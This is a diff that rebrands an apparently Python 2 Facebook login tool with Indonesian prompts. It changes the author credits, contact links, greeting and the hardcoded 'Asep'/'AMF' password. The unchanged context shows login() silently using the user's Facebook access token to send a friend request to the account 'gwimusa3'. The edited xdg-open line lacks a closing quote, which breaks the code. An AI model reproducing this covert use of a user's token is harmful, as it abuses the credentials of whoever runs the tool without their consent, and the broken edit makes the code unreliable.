@@ -54,11 +54,11 @@ logo = """
 \033[32;1m….// (\) ),——
 \033[32;1m…//___//
 \033[32;1m../`—-’ / …
-\033[32;1m./____ / …Åhssine mohamed 🇲🇦
+\033[32;1m./____ / …AsepAMF 🇲🇦
 \033[0;1m╔═══════════════════════════════════════════╗
-\033[0;1m║\033[33;1m* \033[34;1mGithub  \033[1;93m: \033[0;1mhttps://github.com/spider-fb  \033[1;93m                   
+\033[0;1m║\033[33;1m* \033[34;1mGithub  \033[1;93m: \033[0;1mhttps://github.com/AsepAMF  \033[1;93m                   
 \033[0;1m║\033[33;1m* \033[34;1mYT  \033[1;93m    : \033[0;1m\033[4mYotube/Android top4\033[0m \033[1;93m                  
-\033[0;1m║\033[33;1m* \033[34;1mWhatsApp  \033[1;93m : \033[0;1m\033[4m+212682934279\033[0m \033[1;93m       
+\033[0;1m║\033[33;1m* \033[34;1mWhatsApp  \033[1;93m : \033[0;1m\033[4m+625722689694\033[0m \033[1;93m       
 \033[0;1m╚═══════════════════════════════════════════╝
 """
 
@@ -88,7 +88,7 @@ def siapa():
 		siapa()
 	else:
 		os.system('clear')
-		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mMejuah Juah Lae, Horas Medan !!")
+		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mMejuah Juah Lae, assalamualaikum !!")
 		time.sleep(1)
 		loginSC()
 		
@@ -99,7 +99,7 @@ def loginSC():
 	os.system('xdg-open https://tatawirdat.blogspot.com')
         username = raw_input("\033[1;96m[*] \033[1;97mID \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="anak" and password =="binjai":
+	if username =="Asep" and password =="AMF":
 		print"\033[1;96m[✓] \033[1;92mLogin success"
 		time.sleep(1)
 		login()
@@ -149,7 +149,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
+				os.system('xdg-open https://youtu.be/pXPO4EKv3w8)
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
